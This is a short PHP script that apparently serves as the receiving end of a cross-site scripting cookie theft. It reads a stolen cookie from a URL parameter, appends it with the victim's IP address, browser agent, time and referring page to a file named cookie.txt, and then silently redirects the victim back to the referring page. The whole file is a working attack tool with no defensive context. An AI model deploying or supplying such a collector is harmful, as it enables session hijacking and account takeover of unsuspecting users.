<?php
//set time zone and date format
date_default_timezone_set("Asia/Tehran");
$date=date("Y-m-d H:i:s");  
$cookie=$_GET['txt'];
$ip=$_SERVER['REMOTE_ADDR'];
$agent=$_SERVER['HTTP_USER_AGENT'];
$referrer = $_SERVER['HTTP_REFERER'] ?? null;
//store data
$log="cookie = $cookie\n";
$log.="ip = $ip\n";
$log.="agent = $agent\n";
$log.="date = $date\n";
$log.="REFERRER = $referrer\n";
$log.="=======\n";
$f=fopen("cookie.txt","a");
fwrite($f,$log);
//redirect to referrer
header('Location:'. $referrer);
?>